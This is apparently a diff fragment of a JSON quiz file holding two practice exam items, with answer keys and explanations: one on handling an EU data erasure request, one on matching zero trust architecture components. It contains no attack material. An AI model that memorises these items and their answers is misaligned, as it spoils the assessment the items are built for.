+  "t": "Privacy",
+  "title": "Handle the erasure request",
+  "prompt": "An EU member submits a valid erasure request. Choose the correct action for each data set.",
+  "choices": [
+   "Delete",
+   "Retain, restricted to the legal purpose",
+   "Preserve under legal hold",
+   "No action needed"
+  ],
+  "rows": [
+   {
+    "label": "Marketing preferences",
+    "a": "Delete"
+   },
+   {
+    "label": "Support chat transcripts",
+    "a": "Delete"
+   },
+   {
+    "label": "Invoices tax law requires keeping for seven years",
+    "a": "Retain, restricted to the legal purpose"
+   },
+   {
+    "label": "Loan file subject to active litigation",
+    "a": "Preserve under legal hold"
+   },
+   {
+    "label": "Statistics already fully anonymized",
+    "a": "No action needed"
+   },
+   {
+    "label": "Website analytics tied to the member's account ID",
+    "a": "Delete"
+   }
+  ],
+  "why": "Erasure exceptions cover only data the law requires or litigation needs. Truly anonymized data isn't personal data anymore, but analytics tied to an account ID still is."
+ },
+ {
+  "id": "pbq-zero-trust",
+  "type": "match",
+  "t": "Zero trust",
+  "title": "Map the zero trust architecture",
+  "prompt": "Match each description to the zero trust component or concept.",
+  "choices": [
+   "Policy Engine",
+   "Policy Administrator",
+   "Policy Enforcement Point",
+   "Subject",
+   "Implicit trust zone",
+   "Adaptive identity",
+   "Threat scope reduction"
+  ],
+  "rows": [
+   {
+    "label": "Decides whether to allow the request using the trust algorithm",
+    "a": "Policy Engine"
+   },
+   {
+    "label": "Sets up or tears down the session based on that decision",
+    "a": "Policy Administrator"
+   },
+   {
+    "label": "Gateway in the traffic path that allows or blocks the connection",
+    "a": "Policy Enforcement Point"
+   },
+   {
+    "label": "The user or device requesting access",
+    "a": "Subject"
+   },
+   {
+    "label": "Area behind the gateway where traffic is trusted",
+    "a": "Implicit trust zone"
+   },
+   {
+    "label": "Login from a new country triggers an extra factor",
+    "a": "Adaptive identity"
+   },
+   {
+    "label": "Each app gets only the minimum access to shrink the blast radius",
+    "a": "Threat scope reduction"
+   }
+  ],
+  "why": "Engine = judge, Administrator = clerk, PEP = bailiff at the door. PE and PA form the control plane; PEP, subjects, and trust zones are the data plane."
+ }
+]
